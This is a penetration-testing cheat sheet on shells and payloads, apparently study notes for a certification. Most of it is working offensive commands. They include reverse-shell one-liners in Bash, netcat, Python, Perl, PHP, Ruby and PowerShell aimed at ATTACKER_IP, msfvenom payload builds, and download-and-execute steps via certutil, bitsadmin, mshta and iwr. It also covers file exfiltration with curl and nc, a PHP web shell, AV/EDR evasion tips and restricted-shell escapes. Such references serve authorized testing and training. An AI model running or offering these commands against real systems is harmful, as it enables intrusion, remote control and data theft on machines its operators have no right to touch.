# Shells & Payloads

This chapter covers core concepts, techniques, and command references for working with shells and payloads across common offensive security contexts. It’s organized to match a typical CPTS study flow: fundamentals, payload generation, delivery methods, handlers/listeners, shell upgrades, file transfer, port forwarding, AV/EDR evasion basics, Windows/Linux specifics, and troubleshooting.

## 1. Shell Fundamentals
- Shell types:
  - Bind shell: Target opens a listening port; attacker connects in. Pros: simple. Cons: firewall/egress may block inbound.
  - Reverse shell: Target connects out to attacker listener. Pros: better through egress. Cons: requires outbound allow-listing.
  - Interactive vs non-interactive: TTY/PTY provides line-editing, job control, stable I/O.
  - Stagers vs stageless: Staged payload fetches stage from listener (smaller initial payload). Stageless contains full payload (larger but simpler network).
- Common ports: 21, 22, 80/443, 445, 8080, 8443 (choose ports allowed by egress controls).
- Transport choices: TCP (most common), HTTP/HTTPS (proxy-friendly), DNS, ICMP, SMB/Named Pipes (lateral movement), WebSockets.

## 2. Quick Reference: One‑Liner Reverse Shells
- Bash TCP:
  - bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
- Bash /dev/tcp (POSIX):
  - 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT; sh <&196 >&196 2>&196
- Netcat (traditional):
  - nc -e /bin/sh ATTACKER_IP ATTACKER_PORT
- Netcat (OpenBSD variant):
  - rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
- BusyBox nc:
  - busybox nc ATTACKER_IP ATTACKER_PORT -e /bin/sh
- Socat reverse TTY:
  - socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:ATTACKER_PORT
- Python:
  - python3 -c 'import os,pty,socket; s=socket.socket(); s.connect(("ATTACKER_IP",ATTACKER_PORT)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("/bin/bash")'
- Perl:
  - perl -e 'use Socket;$i="ATTACKER_IP";$p=ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
- PHP:
  - php -r '$sock=fsockopen("ATTACKER_IP",ATTACKER_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
- Ruby:
  - ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",ATTACKER_PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
- PowerShell (TCP):
  - powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$o=$r+[Text.Encoding]::ASCII.GetBytes('PS> ');$s.Write($o,0,$o.Length)}" 
- Windows cmd.exe via PowerShell:
  - powershell -c "$client=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT);$stream=$client.GetStream();$writer=New-Object IO.StreamWriter($stream);$buffer=New-Object byte[] 1024;while(($read=$stream.Read($buffer,0,1024)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($buffer,0,$read);$send=(cmd /c $data) 2>&1;$writer.Write($send+"`n");$writer.Flush()}"

## 3. Listeners and Handlers
- Netcat listener:
  - nc -lvnp LISTEN_PORT
- Ncat (TLS support):
  - ncat -lvnp LISTEN_PORT --ssl
- Socat listener with TTY:
  - socat file:`tty`,raw,echo=0 tcp-listen:LISTEN_PORT,reuseaddr
- Metasploit multi/handler (example for windows/x64/meterpreter/reverse_https):
  - msfconsole -q
  - use exploit/multi/handler
  - set PAYLOAD windows/x64/meterpreter/reverse_https
  - set LHOST ATTACKER_IP
  - set LPORT 443
  - set EnableStageEncoding true
  - run -j

## 4. Payload Generation (msfvenom and others)
- msfvenom basics:
  - List payloads: msfvenom -l payloads | grep meterpreter
  - Windows x64 EXE reverse HTTPS:
    - msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f exe -o revhttps.exe
  - Linux x64 ELF reverse TCP:
    - msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o revtcp.elf
  - Raw shellcode (x64):
    - msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f raw -o sc.bin
  - Powershell command:
    - msfvenom -p windows/x64/powershell_reverse_tcp LHOST=IP LPORT=PORT -f psh -o rs.ps1
- Donut for .NET/PE to shellcode:
  - donut -a 2 -f 1 -o payload.bin some.exe
- Nim/Go payloads: build static binaries to reduce dependencies.

## 5. Delivery Methods
- Web delivery:
  - Simple HTTP server: python3 -m http.server 80
  - Impacket smbserver.py SHARE .
  - Python HTTP download (Linux): curl -O http://ATTACKER_IP/payload; wget http://ATTACKER_IP/payload
  - PowerShell download:
    - powershell -c "iwr http://ATTACKER_IP/p.exe -OutFile p.exe"
    - powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/p.exe','p.exe')"
- Living-off-the-land (Windows):
  - certutil -urlcache -split -f http://ATTACKER_IP/p.exe p.exe
  - bitsadmin /transfer t /download /priority foreground http://ATTACKER_IP/p.exe p.exe
  - mshta http://ATTACKER_IP/payload.hta
- SMB/UNC paths:
  - \ATTACKER_IP\SHARE\payload.exe
- HTML application (HTA), JS, VBS droppers; Office macros (with caution).

## 6. Shell Stabilization and Upgrade
- Python PTY:
  - python -c 'import pty; pty.spawn("/bin/bash")'
  - export TERM=xterm; stty rows 50 cols 200
- Socat full TTY:
  - On attacker: socat tcp-listen:4444,reuseaddr file:`tty`,raw,echo=0
  - On target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
- rlwrap for history and shortcuts:
  - rlwrap nc -lvnp 4444
- Fix backspace/CTRL-C:
  - stty -a; stty raw -echo; fg; reset

## 7. File Transfer Cheat Sheet
- From target to attacker via curl:
  - curl -F 'file=@/path/file' http://ATTACKER_IP/upload
- Base64 over terminal:
  - base64 file | tr -d "\n"; on attacker: echo -n '...b64...' | base64 -d > file
- Netcat piping:
  - Attacker: nc -lvnp 9001 > loot.bin
  - Target: nc ATTACKER_IP 9001 < loot.bin
- PowerShell:
  - [IO.File]::WriteAllBytes('out.bin',[Convert]::FromBase64String('BASE64'))

## 8. Pivoting, Port Forwarding, and Tunneling
- SSH dynamic SOCKS proxy:
  - ssh -D 1080 user@pivot -N
- SSH local forward:
  - ssh -L 8080:internal:80 user@pivot
- Chisel:
  - Server (attack box): chisel server -p 8000 --reverse
  - Client (target->attack): chisel client ATTACKER_IP:8000 R:9001:127.0.0.1:3389
- Socat TCP forward:
  - socat tcp-listen:8080,reuseaddr,fork tcp:internal:80
- SSHuttle (transparent proxy for subnets):
  - sshuttle -r user@pivot 10.0.0.0/24

## 9. AV/EDR Evasion Basics (Ethical/Legal Only)
- Obfuscation: PowerShell string obfuscation, base64 encode, environment variable splits.
- LOLBAS: rundll32, regsvr32, mshta, installutil, wmic for proxy exec.
- Binary hardening: compile with different packers, change entropy/profile, sleep/jitter, indirect syscalls (advanced).
- AMSI and Script Block logging bypasses change frequently; prefer in-memory and signed binaries in legit tests with approvals.

## 10. Windows Notes
- Execution policy bypass:
  - powershell -ep bypass -nop -w hidden -c "..."
- UAC contexts: high-integrity vs medium; token privileges matter for lateral movement.
- Named pipe reverse shells (Cobalt/Meterpreter) useful inside Windows networks.
- SMB exec tools: psexec.py, wmiexec.py, smbexec.py (Impacket) for semi-interactive shells.

## 11. Linux/Unix Notes
- Restricted shells (rbash) escapes:
  - vi/vim :! /bin/sh
  - awk 'BEGIN { system("/bin/sh") }'
  - find . -exec /bin/sh \; -quit
- SUID/Capabilities can spawn rootshell when misconfigured (GTFOBins reference).

## 12. Web Reverse Shells
- PHP:
  - <?php system($_GET['cmd']); ?>
  - pentestmonkey php-reverse-shell.php (configure IP/PORT)
- ASPX:
  - msfvenom -p windows/x64/meterpreter/reverse_tcp -f aspx -o shell.aspx LHOST=IP LPORT=PORT
- JSP:
  - msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw -o shell.jsp

## 13. Troubleshooting Checklist
- Connectivity:
  - Is listener up and reachable (firewall/NAT/egress)?
  - Test with: nc -vz ATTACKER_IP PORT, curl -kv http://ATTACKER_IP:PORT
- Architecture mismatch (x86/x64/ARM) and libc/glibc issues for Linux binaries
- AV/EDR quarantining or script blocking
- Proxy requirements (use HTTP/HTTPS payloads or proxy-aware clients)
- TTY missing: upgrade with pty.spawn/socat

## 14. Operational Safety
- Only test on systems you own or have explicit authorization to test.
- Keep artifacts named innocuously and clean up: delete payloads, logs, scheduled tasks, services.
- Document IOCs, ports, times, and payload hashes for reporting.

---
Placeholders to replace during use:
- ATTACKER_IP -> your callback IP or DNS name
- ATTACKER_PORT/LISTEN_PORT/PORT -> chosen reachable port
